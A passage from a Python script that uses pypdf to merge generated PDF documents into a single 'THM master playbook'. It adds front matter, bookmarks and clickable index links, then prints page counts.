    page_counts = {path.name: len(PdfReader(str(path)).pages) for path, _, _ in all_docs}
    front_pdf = TMP_DIR / "THM_master_playbook_frontmatter.pdf"
    final_pdf = OUT_DIR / "THM_master_playbook.pdf"
    link_rects, _ = build_master_frontmatter(front_pdf, all_docs, page_counts)

    writer = PdfWriter()
    front_reader = PdfReader(str(front_pdf))
    for page in front_reader.pages:
        writer.add_page(page)
    writer.add_outline_item("Indice y mapa de uso", 0)
    current_page = len(front_reader.pages)
    target_pages = {}
    for path, title, _ in all_docs:
        target_pages[title] = current_page
        writer.add_outline_item(title, current_page)
        reader = PdfReader(str(path))
        for page in reader.pages:
            writer.add_page(page)
        current_page += len(reader.pages)
    invisible_border = ArrayObject([NumberObject(0), NumberObject(0), NumberObject(0)])
    for link in link_rects:
        writer.add_annotation(
            link["front_page"],
            Link(
                rect=link["rect"],
                target_page_index=target_pages[link["target_title"]],
                border=invisible_border,
            ),
        )
    with final_pdf.open("wb") as handle:
        writer.write(handle)
    return final_pdf, page_counts


def main():
    generated_paths = [build_individual_doc(doc) for doc in GENERATED_DOCS]
    master, page_counts = build_master(generated_paths)
    print(master)
    print(f"generated={len(generated_paths)}")
    print(f"master_pages={len(PdfReader(str(master)).pages)}")
    for path in generated_paths:
        print(f"{path.name}: {len(PdfReader(str(path)).pages)} pages")
    for name, pages in page_counts.items():
        print(f"source {name}: {pages} pages")


if __name__ == "__main__":
    main()
